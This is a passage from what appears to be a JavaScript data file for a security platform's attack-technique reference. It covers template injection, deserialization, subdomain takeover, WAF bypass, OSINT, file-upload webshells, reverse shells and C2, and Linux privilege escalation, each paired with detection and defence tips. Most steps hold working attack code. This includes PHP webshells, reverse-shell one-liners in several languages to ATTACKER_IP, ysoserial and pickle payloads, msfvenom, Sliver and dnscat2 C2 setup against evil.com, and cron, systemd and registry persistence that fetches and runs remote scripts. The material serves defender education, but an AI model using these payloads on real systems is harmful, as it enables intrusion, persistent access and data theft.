      { title: "Twig RCE (PHP)", desc: "Use Twig's filter chain to call PHP system functions.", cmd: `{{_self.env.registerUndefinedFilterCallback("exec")}}\n{{_self.env.getFilter("id")}}\n\n# Or:\n{{['id']|filter('system')}}\n{{['bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"']|filter('system')}}` },
    ],
    detect: [
      "Alert on template syntax characters ({{ }}, <%= %>, ${) in user inputs",
      "Monitor responses for unexpected numerical evaluations of injected math expressions",
      "WAF rules matching Jinja2/Twig/FreeMarker syntax patterns",
    ],
    defend: [
      "Never pass user input directly to a template render function — render the template first, then insert data as variables",
      "Use template engine sandbox mode: Jinja2 SandboxedEnvironment, Twig sandbox extension",
      "HTML-encode all user data before inserting into templates",
      "Prefer logic-less templates (Mustache/Handlebars with no helpers) for user-generated content",
    ],
  },
  {
    id: "deser",
    title: "Deserialization Attacks",
    category: "Server-Side",
    severity: "critical",
    icon: Cpu,
    summary: "When an app deserializes untrusted data (from cookies, API bodies, or file uploads) without validation, attackers can craft malicious serialized objects that execute arbitrary code when deserialized.",
    howItWorks: "Serialization converts objects to bytes. Deserialization reverses this. If the app deserializes data it doesn't control (e.g. a cookie value), attacker-crafted bytes can trigger gadget chains in loaded libraries to achieve RCE. Most severe in Java, PHP, Python pickle, and .NET.",
    steps: [
      { title: "Find serialized data", desc: "Look for base64 blobs in cookies, HTTP headers, or JSON fields. Java serialization starts with 'rO0A' (base64 for 0xaced0005).", cmd: `# Java serialized object signature (base64):\nrO0ABXNyAA...\n\n# PHP serialized object:\nO:8:"UserData":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}\n\n# Python pickle (look for .pkl files or hex-encoded payloads)\n# Check cookies, X- headers, JSON fields named 'data', 'payload', 'state'` },
      { title: "Java deserialization — ysoserial", desc: "Generate gadget chain payloads using ysoserial for common libraries.", cmd: `# Download ysoserial:\ncurl -L https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -o ysoserial.jar\n\n# Generate payload (CommonsCollections gadget chain)\njava -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0\n\n# Common gadget chains:\n# CommonsCollections1-7 (Apache Commons)\n# Spring1, Spring2 (Spring Framework)\n# Groovy1 (Groovy)\n# JRMPClient (remote class loading)\n\n# Reverse shell payload:\njava -jar ysoserial.jar CommonsCollections6 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' | base64 -w0` },
      { title: "PHP object injection", desc: "Craft a PHP serialized object that triggers magic methods (__destruct, __wakeup) on deserialization.", cmd: `# Identify serialized PHP in cookie/param — looks like:\nO:4:"User":1:{s:4:"name";s:5:"admin";}\n\n# If a class with __destruct does file operations:\nclass Logger {\n  public $logfile = '/var/www/html/shell.php';\n  public $data = '<?php system($_GET[cmd]); ?>';\n}\n\n# Serialize your malicious object:\nphp -r 'echo serialize(new Logger());'\n# → O:6:"Logger":2:{s:7:"logfile";s:29:"/var/www/html/shell.php";s:4:"data";s:28:"<?php system($_GET[cmd]); ?>";}' ` },
      { title: "Python pickle RCE", desc: "Python's pickle module executes arbitrary code on deserialization.", cmd: `import pickle, os, base64\n\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ('id',))\n\n# Generate malicious pickle\npayload = base64.b64encode(pickle.dumps(Exploit())).decode()\nprint(payload)  # Submit this in the affected field` },
    ],
    detect: [
      "Monitor for Java serialization magic bytes (0xACED, rO0A) in HTTP inputs",
      "Alert on class loading events outside expected packages (Java)",
      "File integrity monitoring: alert on new PHP/ASPX files in web directories",
      "Network monitoring: deserialization exploits often spawn reverse shells (outbound TCP)",
    ],
    defend: [
      "Never deserialize untrusted data — use safe formats (JSON, MessagePack) instead",
      "Java: use look-ahead deserialization filters (ObjectInputFilter, SerialKiller)",
      "PHP: avoid unserialize() on user data — use JSON decode instead",
      "Python: never unpickle user-supplied data — use JSON or msgpack",
      "Implement allowlists for deserializable class names",
    ],
  },
  {
    id: "subdomain-takeover",
    title: "Subdomain Takeover",
    category: "DNS & Infrastructure",
    severity: "high",
    icon: Globe,
    platformTool: { label: "Subdomain Scout", route: "/subdomain-scan" },
    summary: "When a subdomain's DNS record points to a cloud service (Heroku, GitHub Pages, S3, Azure) that no longer exists, an attacker can claim that service and serve malicious content under the victim's trusted domain.",
    howItWorks: "DNS still points to e.g. myapp.github.io, but the GitHub Pages repo was deleted. The attacker creates a GitHub Pages repo named 'myapp' under their account. Now subdomain.victim.com serves the attacker's content with the victim's cookie scope.",
    steps: [
      { title: "Enumerate all subdomains", desc: "Collect all subdomains using passive recon sources.", cmd: `# Use ProxhqVPN Subdomain Scout for 9 passive sources\n# Or via command line:\namass enum -passive -d target.com\nsubfinder -d target.com -silent\nassetfinder --subs-only target.com\n\n# Also check certificate transparency:\ncurl 'https://crt.sh/?q=%25.target.com&output=json' | jq '.[].name_value' | sort -u` },
      { title: "Check for dangling DNS records", desc: "For each subdomain, check if it resolves to a service that returns 'not found' errors.", cmd: `# Install subjack\ngo install github.com/haccer/subjack@latest\n\n# Run against your subdomain list:\nsubjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl\n\n# Or check manually:\ndig CNAME staging.target.com  # → myapp.github.io\ncurl -s https://staging.target.com  # → "There isn't a GitHub Pages site here"\ncurl -s https://myapp.azurewebsites.net  # → "404 Web Site not found"\ncurl -s https://myapp.s3.amazonaws.com  # → "NoSuchBucket"` },
      { title: "Claim the dangling service", desc: "Register the unclaimed service under your own account.", cmd: `# GitHub Pages example:\n# 1. Create repo named 'myapp' under your GitHub account\n# 2. Enable GitHub Pages in repo settings\n# 3. staging.target.com now serves YOUR content\n\n# S3 example:\naws s3api create-bucket --bucket myapp --region us-east-1\necho 'Proof-of-concept' > index.html\naws s3 cp index.html s3://myapp/ --acl public-read\n\n# Heroku:\nheroku create myapp\n# → staging.target.com now points to your Heroku app` },
    ],
    detect: [
      "Monitor your DNS records — alert on CNAME/A records pointing to decommissioned services",
      "Regularly audit all subdomains for service existence",
      "Use automated scanners (subjack, can-i-take-over-xyz) in your CI/CD pipeline",
      "Monitor certificate transparency logs for unexpected certs issued for your subdomains",
    ],
    defend: [
      "Remove DNS records when decommissioning services — delete CNAME/A before deleting the service",
      "Audit all CNAME records quarterly — map each to a live service",
      "Use short TTLs on external-pointing CNAMEs to detect issues faster",
      "Consider a bug bounty program — responsible researchers will report these to you",
    ],
  },
  {
    id: "waf-bypass",
    title: "WAF Bypass Techniques",
    category: "Evasion",
    severity: "high",
    icon: Shield,
    platformTool: { label: "WAF Bypass Generator", route: "/waf-bypass" },
    summary: "Web Application Firewalls block attack patterns via signatures. Attackers use encoding, case variation, whitespace tricks, chunked encoding, and request fragmentation to deliver payloads that bypass WAF rules while still being parsed by the backend.",
    howItWorks: "WAFs match signatures against the raw HTTP request. If you can transform your payload so the WAF doesn't recognize it, but the backend application still evaluates it as the original attack, you bypass the protection. Different WAFs (ModSecurity, Cloudflare, AWS) have different blindspots.",
    steps: [
      { title: "Identify the WAF", desc: "Determine which WAF is protecting the target before crafting bypass payloads.", cmd: `# wafw00f auto-detects WAF technology\npip install wafw00f\nwafw00f https://target.com\n\n# Or check response headers:\ncurl -I https://target.com | grep -i 'cf-ray\\|x-sucuri\\|x-waf\\|server:'\n# Cloudflare: cf-ray header\n# Sucuri: x-sucuri-id\n# AWS WAF: x-amzn-waf\n# ModSecurity: mod_security in Server header` },
      { title: "URL encoding bypasses", desc: "Encode characters that trigger WAF signatures.", cmd: `# Single encode\n' OR 1=1--  →  %27%20OR%201%3D1--\n\n# Double encode\n%27  →  %2527\n\n# Unicode encode\n'  →  %u0027\n<  →  %u003c\n\n# HTML entity (for XSS in reflected context)\n<script>  →  &lt;script&gt;\n\n# Hex encode (SQL)\n' OR 1=1  →  ' OR 0x313d31--` },
      { title: "Case and comment obfuscation", desc: "SQL keywords in WAF rules are often case-sensitive.", cmd: `# Case variation\nSELECT  →  SeLeCt  →  sElEcT\nUNION   →  uNiOn\n\n# Inline comments (MySQL, MSSQL)\nSELECT  →  SEL/**/ECT\nUNION SELECT  →  UNION/**/SELECT\n\n# Version comments (MySQL executes inside /*!*/)\n/*!UNION*/ /*!SELECT*/ 1,2,3--\n\n# Whitespace alternatives\nSELECT%09FROM  (tab)\nSELECT%0aFROM  (newline)\nSELECT%0dFROM  (carriage return)` },
      { title: "Chunked Transfer Encoding bypass", desc: "Some WAFs inspect only the first chunk of chunked HTTP bodies, missing payloads split across chunks.", cmd: `# Use Burp Suite → Repeater → right-click → Change body encoding → Chunked\n# Split the payload:\nPOST /login HTTP/1.1\nTransfer-Encoding: chunked\n\n4\nuser\n7\n=admin\n1\n'\n8\nOR 1=1--\n0\n\n# Tools: chunked-requests Python library\npip install chunked-requests` },
      { title: "Host header and path bypass", desc: "WAF rules may not apply to requests with unusual Host headers or path formats.", cmd: `# Path confusion:\nhttps://target.com/%2f..%2fapi/vulnerable\nhttps://target.com/api/./vulnerable\nhttps://target.com//api//vulnerable\n\n# HTTP parameter pollution:\n?param=safe&param=<script>alert(1)</script>\n\n# Content-Type switching (some WAFs only inspect application/json):\ncurl -X POST https://target.com/api \\\n  -H 'Content-Type: text/plain' \\\n  -d '{"query":"1 UNION SELECT password FROM users"}'` },
    ],
    detect: [
      "WAF alert on encoded payloads — enable URL-decode before inspection",
      "Inspect chunked transfer encoding bodies completely before passing to app",
      "Log and alert on double-encoded requests (%25xx) — legitimate users don't double-encode",
      "Rate-limit clients that trigger high WAF block rates — likely a bypass test",
    ],
    defend: [
      "Layer WAF with server-side input validation — WAF is one layer, not the only one",
      "Enable WAF 'decode then inspect' mode to handle encoding bypass attempts",
      "Use RASP (Runtime Application Self-Protection) for in-application protection",
      "Keep WAF rule sets updated — vendors push bypass fixes regularly",
      "Test your WAF with WAFBench or Nikto regularly to verify effectiveness",
    ],
  },
  {
    id: "recon",
    title: "Passive Recon & OSINT",
    category: "Reconnaissance",
    severity: "medium",
    icon: Search,
    platformTool: { label: "OSINT Recon", route: "/osint" },
    summary: "Before any active attack, hackers gather intelligence on the target without making direct contact — using DNS, certificate logs, WHOIS, Shodan, LinkedIn, and GitHub to map the attack surface.",
    howItWorks: "OSINT (Open Source Intelligence) uses publicly available data. Every subdomain in a CT log, every IP in Shodan, every leaked credential in HIBP, and every internal hostname in a job listing is intelligence. Skilled attackers spend 80% of their time on recon.",
    steps: [
      { title: "DNS reconnaissance", desc: "Enumerate all DNS records for the target domain.", cmd: `# A/AAAA/MX/TXT/NS/CNAME/SOA\ndig ANY target.com @8.8.8.8\ndnsx -d target.com -a -aaaa -mx -ns -txt -cname\n\n# Zone transfer attempt (often disabled, but worth trying)\ndig axfr target.com @ns1.target.com\n\n# Reverse DNS for a netblock\nfor ip in 192.168.1.{1..254}; do dig -x $ip | grep PTR; done` },
      { title: "Certificate Transparency logs", desc: "CT logs record every TLS cert ever issued — exposing all subdomains including internal ones.", cmd: `# crt.sh query\ncurl 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u\n\n# Get IPs for each subdomain\ncurl 'https://crt.sh/?q=%25.target.com&output=json' | \\\n  jq -r '.[].name_value' | sort -u | \\\n  xargs -I{} dig +short {}\n` },
      { title: "Shodan / Censys fingerprinting", desc: "Find all publicly exposed services — open ports, server banners, TLS certs — for the target's IP ranges.", cmd: `# Shodan CLI\npip install shodan\nshodan search 'hostname:target.com'\nshodan search 'ssl.cert.subject.cn:target.com'\nshodan host 192.0.2.1  # detailed host info\n\n# Search for specific tech stack\nshodan search 'org:"Target Corp" http.title:"Apache"'\nshodan search 'org:"Target Corp" product:"Jenkins"'\n\n# Censys (API key required)\npip install censys\ncensys search 'target.com' --index certificates` },
      { title: "GitHub secret scanning", desc: "Search GitHub for accidentally committed secrets, API keys, and internal endpoints.", cmd: `# GitHub dorks via search:\nsite:github.com "target.com" "api_key"\nsite:github.com "target.com" "password"\nsite:github.com "target.com" "secret"\nsite:github.com "target.com" "internal"\nsite:github.com "@target.com" "-----BEGIN"\n\n# Automated:\npip install trufflehog\ntrufflehog github --org=targetorg\ngit-secrets --scan -r /cloned/repo` },
      { title: "WHOIS, ASN, and BGP recon", desc: "Determine the target's IP ranges, ASN, and network provider for complete infrastructure mapping.", cmd: `# WHOIS\nwhois target.com\nwhois 192.0.2.0\n\n# ASN lookup\ncurl 'https://api.bgpview.io/search?query_term=target.com'\n\n# Get all IP ranges for an ASN\ncurl 'https://api.bgpview.io/asn/AS12345/prefixes'\n\n# Then scan the IP ranges:\nnmap -iL ip_ranges.txt -sV -p 80,443,8080,8443 --open` },
    ],
    detect: [
      "Monitor CT logs for unexpected certs issued for your domain (use SSLMate CertSpotter or Facebook's CT monitor)",
      "Set up Google Alerts and GitHub search alerts for your domain name + 'api_key'",
      "Shodan Monitor: subscribe to alerts when new ports/services appear on your IPs",
      "DNS query logging: if an attacker does a zone transfer attempt, it appears in NS logs",
    ],
    defend: [
      "Don't put internal hostnames in public TLS certificates (use wildcards or split DNS)",
      "Use .gitignore and pre-commit hooks (git-secrets) to prevent committing secrets",
      "Rotate any API keys that may have been exposed publicly — assume they're compromised",
      "Register your ASN ranges with Shodan Monitor to get alerts on newly exposed services",
      "Remove sensitive information from WHOIS (use registrar privacy protection)",
    ],
  },
  // ─── NEW ENTRIES ────────────────────────────────────────────────────────────
  {
    id: "file-upload",
    title: "File Upload Exploitation & Webshell Injection",
    category: "Injection",
    severity: "critical",
    icon: FileText,
    platformTool: { label: "Deception Engine", route: "/deception-engine" },
    summary: "Attackers abuse file upload endpoints to place executable code (webshells) on a server — gaining persistent remote command execution. The Deception Engine's /trap-pma and /trap-wp honeypots capture every upload attempt including the payload bytes.",
    howItWorks: "Upload endpoints accept files from users (avatars, documents, imports). If the server stores files inside the webroot AND doesn't properly validate file type, an attacker uploads a .php/.aspx/.jsp file disguised as an image. Once uploaded, they navigate to the file's URL and interact with it directly. Extension filtering, MIME-type validation, and magic-byte checks are the three defense layers — and all three have known bypasses.",
    steps: [
      { title: "Find upload endpoints", desc: "Probe every form, API endpoint, and import feature. Check profile pictures, document uploads, import CSVs, and any multipart/form-data requests.", cmd: `# Burp Suite — filter HTTP history for multipart/form-data:\n# Proxy → HTTP History → filter: Request type = Form / Multipart\n\n# Or search JS for upload endpoints:\ngrep -rE "upload|multipart|FormData|enctype" src/ --include="*.js"\n\n# Check common paths:\ncurl -s https://target.com/upload\ncurl -s https://target.com/api/upload\ncurl -s https://target.com/admin/import\ncurl -s https://target.com/profile/avatar` },
      { title: "Test basic extension bypass", desc: "Submit a PHP webshell renamed with allowed extensions. Many apps check only the file extension string, not the actual content.", cmd: `# PHP webshell payload (save as shell.php)\n<?php system($_GET['cmd']); ?>\n\n# Also prepare minimal one-liners for stealth:\n<?php @eval($_POST['x']); ?>              # eval via POST\n<?php echo shell_exec($_REQUEST['c']); ?> # shell_exec\n\n# Extension bypass attempts (try each):\nshell.php          # baseline — if blocked, try below\nshell.php.jpg      # double extension — some apps take last segment\nshell.pHp          # case variation\nshell.php%00.jpg   # null byte (PHP < 5.3.4, older apps)\nshell.phtml        # alternate PHP extension\nshell.php5         # PHP 5 extension\nshell.shtml        # SSI extension (Apache)\nshell.phar         # PHP archive — executed as PHP\nshell.php;.jpg     # semicolon bypass (IIS)\nshell.php.         # trailing dot (Windows)\nshell .php         # leading space` },
      { title: "MIME type and magic byte bypass", desc: "Apps checking Content-Type can be fooled by changing the header. Apps checking magic bytes require prepending the correct bytes.", cmd: `# Change Content-Type in Burp Suite to bypass MIME check:\n# Original: Content-Type: application/php\n# Change to: Content-Type: image/jpeg\n\n# Magic byte bypass — prepend JPEG header bytes to PHP code:\nprintf '\\xff\\xd8\\xff\\xe0' > shell.jpg  # JPEG magic bytes\necho '<?php system($_GET["cmd"]); ?>' >> shell.jpg\n\n# Or use ExifTool to inject PHP into a real JPEG's metadata:\nexiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg\ncp photo.jpg shell.php.jpg\n\n# PNG magic bytes:\nprintf '\\x89PNG\\r\\n\\x1a\\n' > shell.png\necho '<?php system($_GET["cmd"]); ?>' >> shell.png` },
      { title: "ImageMagick / processing bypass (ImageTragick)", desc: "If uploads are processed by ImageMagick, the image content itself can trigger command execution.", cmd: `# ImageTragick (CVE-2016-3714) — save as exploit.mvg or exploit.svg:\npush graphic-context\n  viewbox 0 0 640 480\n  fill 'url(https://example.com/"|id; echo "')'\npop graphic-context\n\n# Newer bypass via MSL file (CVE-2023-34152):\n# Upload a .svg or .msl file that reads /etc/passwd:\n<?xml version="1.0" encoding="UTF-8"?>\n<image>\n  <read filename="label:@/etc/passwd"/>\n  <write filename="/var/www/html/uploads/out.txt"/>\n</image>` },
      { title: "Access the webshell and escalate", desc: "Navigate to the uploaded file's URL. Start with simple commands, escalate to a full interactive reverse shell.", cmd: `# Verify command execution:\nhttps://target.com/uploads/shell.php?cmd=id\nhttps://target.com/uploads/shell.php?cmd=whoami\nhttps://target.com/uploads/shell.php?cmd=cat+/etc/passwd\n\n# Read application secrets:\nhttps://target.com/uploads/shell.php?cmd=cat+/var/www/html/.env\nhttps://target.com/uploads/shell.php?cmd=env\nhttps://target.com/uploads/shell.php?cmd=cat+/proc/self/environ\n\n# Upgrade to interactive reverse shell via the webshell:\n# Step 1: start your listener\nnc -lvnp 4444\n\n# Step 2: inject reverse shell via cmd parameter\ncmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'\n\n# Step 3: stabilize the shell\npython3 -c 'import pty;pty.spawn("/bin/bash")'\nexport TERM=xterm\n# Ctrl+Z → stty raw -echo; fg` },
      { title: "Persistent backdoor installation", desc: "Once RCE is achieved, attackers install a persistent C2 implant so the webshell is no longer needed.", cmd: `# Write a cron job backdoor:\necho '* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' | crontab -\n\n# Add SSH authorized key:\nmkdir -p ~/.ssh\necho 'ssh-rsa AAAA...YOUR_PUBLIC_KEY... attacker' >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\n\n# Deploy a more capable webshell (China Chopper equivalent):\n# B374k, WSO, r57 — all hide in upload directories\n# These communicate over HTTP/S to avoid firewall blocks\n\n# Or install a lightweight C2 agent (Sliver, Covenant, Havoc):\ncurl -s https://ATTACKER_C2/agent.sh | bash` },
    ],
    detect: [
      "File integrity monitoring (FIM) on upload directories — alert on new .php/.aspx/.jsp files",
      "Process monitoring: web server spawning shells (sh, bash, cmd.exe as child of nginx/httpd)",
      "Outbound connection alerts from web server process (reverse shell callback)",
      "The ProxhqVPN Deception Engine /trap-pma and /trap-wp honeypots log every upload attempt with the full payload bytes captured and stored in deception_events",
      "Ghost Trace detects C2 beaconing from installed implants (periodic outbound HTTP patterns)",
      "YARA scanning of upload directories for webshell signatures",
    ],
    defend: [
      "Store uploaded files OUTSIDE the webroot — /var/uploads/ not /var/www/html/uploads/",
      "Validate magic bytes server-side using a library like file-type (Node) or python-magic",
      "Rename all uploaded files to a UUID with a safe extension — never preserve the original filename",
      "Serve uploads through a proxy that sets Content-Disposition: attachment (forces download, never execution)",
      "Disable PHP/CGI execution in upload directories via .htaccess or Nginx config",
      "Run file processing (image resize, PDF preview) in isolated containers with no network access",
    ],
  },
  {
    id: "initial-access",
    title: "Initial Access, Reverse Shells & C2 Beaconing",
    category: "Post-Exploitation",
    severity: "critical",
    icon: Radio,
    platformTool: { label: "Ghost Trace", route: "/ghost-trace" },
    summary: "After exploiting any vulnerability, attackers establish a persistent Command & Control (C2) channel. Understanding how these channels work is essential for defenders — Ghost Trace analyzes outbound WireGuard peer behavior to detect active C2 beaconing.",
    howItWorks: "A reverse shell connects outbound from the victim to the attacker (bypasses inbound firewall rules). C2 frameworks (Metasploit, Cobalt Strike, Sliver, Havoc) build on this with encrypted beaconing, tasking queues, and evasion. The implant periodically polls the C2 server ('beacons') for new commands. Modern C2s use HTTPS, DNS, or even social media APIs as covert channels to blend with normal traffic.",
    steps: [
      { title: "One-liner reverse shells (Linux)", desc: "Quick reverse shells using native binaries. Start your listener before injecting.", cmd: `# Always start listener first:\nnc -lvnp 4444\n# Or multi-handler in Metasploit:\nmsfconsole -q -x "use multi/handler; set payload linux/x64/shell/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"\n\n# Bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n# Bash (UDP — bypasses TCP egress rules)\nbash -i >& /dev/udp/ATTACKER_IP/4444 0>&1\n\n# Python 3\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'\n\n# Perl\nperl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'\n\n# PHP (inject via RCE/webshell)\nphp -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'\n\n# PowerShell (Windows)\npowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` },
      { title: "Shell stabilization (fully interactive TTY)", desc: "A raw reverse shell has no tab completion, no arrow keys, Ctrl+C kills the connection. Stabilize it for full interactivity.", cmd: `# On victim — spawn PTY with Python:\npython3 -c 'import pty; pty.spawn("/bin/bash")'\n\n# Background the shell:\n[Ctrl+Z]\n\n# On attacker — fix terminal size:\nstty raw -echo\nfg\n\n# Set environment:\nexport TERM=xterm-256color\nstty rows 50 cols 200\n\n# Alternative: use rlwrap for readline support:\nrlwrap nc -lvnp 4444\n\n# Or use socat for a fully encrypted TTY:\n# Attacker:\nsocat file:$(tty),raw,echo=0 tcp-listen:4444\n# Victim:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444` },
      { title: "C2 frameworks — Metasploit Meterpreter", desc: "Meterpreter is an in-memory agent with file transfer, screenshot, keylogging, pivoting, and more. It uses TLS and encrypted comms.", cmd: `# Generate Meterpreter payload:\nmsfvenom -p linux/x64/meterpreter/reverse_tcp \\\n  LHOST=ATTACKER_IP LPORT=4444 -f elf -o agent.elf\n\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=ATTACKER_IP LPORT=443 -f exe -o agent.exe\n\nmsfvenom -p php/meterpreter/reverse_tcp \\\n  LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php\n\n# Set up handler in Metasploit:\nmsfconsole -q\nuse exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nrun\n\n# Once connected — key Meterpreter commands:\ngetuid          # who am I?\nsysinfo         # system info\nhashdump        # dump password hashes (needs root)\ndownload /etc/shadow /tmp/shadow\nupload /tmp/evil.sh /tmp/evil.sh\nsearch -f *.env  # find .env files\nshell           # drop to OS shell\npidginject -p 1  # inject into process 1\nroute add 10.0.0.0/8 1  # pivot into internal subnet` },
      { title: "C2 over HTTPS (Sliver — modern, open-source)", desc: "Sliver generates implants that beacon over HTTPS/DNS/WireGuard using mTLS. Extremely hard to detect from legitimate HTTPS traffic.", cmd: `# Install Sliver C2 server:\ncurl https://sliver.sh/install | sudo bash\n\n# Start server:\nsliver-server\n\n# Generate an implant (HTTPS beacon):\nsliver > generate --http ATTACKER_IP:443 --os linux --arch amd64 --name my-implant\n\n# Generate a DNS beacon (ultra-covert — uses DNS for C2 traffic):\nsliver > generate --dns c2.attacker.com --os linux --arch amd64\n\n# Start HTTPS/DNS listeners:\nsliver > https --lhost 0.0.0.0 --lport 443\nsliver > dns --domains c2.attacker.com\n\n# Once implant connects:\nsliver > sessions                    # list active sessions\nsliver > use SESSION_ID              # interact\nsliver (session) > whoami\nsliver (session) > ls /etc\nsliver (session) > download /etc/shadow\nsliver (session) > sideload ./inject.so  # inject SO into process` },
      { title: "C2 over DNS (covert channel — bypasses most firewalls)", desc: "DNS is almost never blocked outbound. Attackers encode C2 traffic in DNS TXT/A record queries. Every lookup exfiltrates data or receives commands.", cmd: `# How DNS C2 works:\n# 1. Attacker controls: evil.com\n# 2. Implant sends data encoded in DNS queries:\n#    cmd_result_b64.session_id.evil.com → Attacker's NS server receives it\n# 3. Attacker sends commands in DNS A/TXT responses\n\n# Tools: dnscat2, iodine, DNSExfiltrator\n\n# dnscat2 server (attacker):\ngem install dnscat2\nruby dnscat2.rb --dns domain=evil.com,host=0.0.0.0\n\n# dnscat2 client (victim — one binary):\n./dnscat --dns domain=evil.com,server=ATTACKER_NS\n\n# Commands in dnscat2 session:\nwindows             # list active connections\nwindow -i 1         # interact with session\nexec /bin/bash\n\n# Detection: DNS queries for random long subdomains\n# e.g. aGVsbG8gd29ybGQ.SESSID.evil.com (base64-encoded data)\n# Ghost Trace detects this as anomalous DNS beacon pattern` },
      { title: "Persistence mechanisms (survive reboots)", desc: "Attacker ensures access persists through reboots, password changes, and partial cleanup.", cmd: `# Linux persistence:\n\n# 1. Cron job (fires every minute, restores reverse shell):\n(crontab -l 2>/dev/null; echo '* * * * * curl -s http://ATTACKER/beacon.sh | bash') | crontab -\n\n# 2. Systemd service:\ncat > /etc/systemd/system/NetworkManager-helper.service <<EOF\n[Unit]\nDescription=NetworkManager Helper\nAfter=network.target\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable NetworkManager-helper\n\n# 3. SSH authorized key:\necho 'ssh-rsa AAAA...ATTACKER_PUBKEY...' >> ~/.ssh/authorized_keys\n\n# 4. LD_PRELOAD hook (runs code in every dynamically linked process):\necho '/tmp/evil.so' >> /etc/ld.so.preload\n\n# Windows persistence:\n# Registry run key:\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "powershell -WindowStyle Hidden -File C:\\Users\\Public\\beacon.ps1"\n\n# Scheduled task:\nschtasks /create /tn "WindowsUpdate" /tr "powershell -File C:\\Users\\Public\\beacon.ps1" /sc onlogon /ru SYSTEM /f` },
    ],
    detect: [
      "Ghost Trace analyzes WireGuard peer traffic patterns — periodic beaconing shows as regular small-packet outbound bursts at fixed intervals",
      "Ghost Chain maps the full kill chain: Initial Access → Execution → Persistence → C2 → Exfiltration stages",
      "Outbound connections from non-browser processes (httpd, nginx, node) to rare external IPs",
      "DNS queries with high-entropy subdomains (base64 data) — dnscat2/iodine signatures",
      "New cron jobs, systemd services, or registry Run keys created outside normal provisioning",
      "Process tree anomalies: web server process spawning bash/python/powershell",
      "The Deception Engine logs all reverse shell connection attempts hitting honeypot ports",
    ],
    defend: [
      "Egress filtering: web server processes should only connect to known external endpoints (strict allowlist)",
      "Deploy Ghost Trace on all WireGuard peers — it identifies C2 beaconing by traffic profile, not just IPs",
      "Auditd / EDR on all Linux servers: alert on new cron jobs, systemd service files, LD_PRELOAD changes",
      "File integrity monitoring: alert on new executables in /tmp, /dev/shm, /var/www",
      "Block DNS exfiltration: use a DNS firewall that rejects queries for high-entropy subdomains",
      "Network segmentation: internal servers should not be able to initiate connections to the internet",
    ],
  },
  {
    id: "lateral-movement",
    title: "Lateral Movement & Privilege Escalation",
    category: "Post-Exploitation",
    severity: "critical",
    icon: Cpu,
    platformTool: { label: "Ghost Chain", route: "/ghost-chain" },
    summary: "After gaining initial access to one machine, attackers move laterally to reach higher-value targets (domain controllers, databases, secrets vaults). Ghost Chain automates kill-chain discovery and maps exactly this 5-stage movement.",
    howItWorks: "Lateral movement uses credentials, trust relationships, and misconfigured services to hop between hosts. Privilege escalation on Linux exploits SUID binaries, sudo misconfigurations, kernel exploits, writable cron jobs, or PATH manipulation. On Windows: token impersonation, DLL hijacking, unquoted service paths, and Pass-the-Hash. The goal is always: domain admin, root, or access to the target data.",
    steps: [
      { title: "Linux privilege escalation — automated enumeration", desc: "Always run automated enum scripts first — they find 90% of common privesc paths in seconds.", cmd: `# LinPEAS — comprehensive Linux enumeration:\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas.txt\n\n# LinEnum (alternative, older):\nwget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/linenum.sh\nchmod +x /tmp/linenum.sh && /tmp/linenum.sh -t\n\n# LSE (Linux Smart Enumeration — clean output):\ncurl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo /tmp/lse.sh\nbash /tmp/lse.sh -l 1  # level 1 = interesting findings only\nbash /tmp/lse.sh -l 2  # level 2 = full dump` },
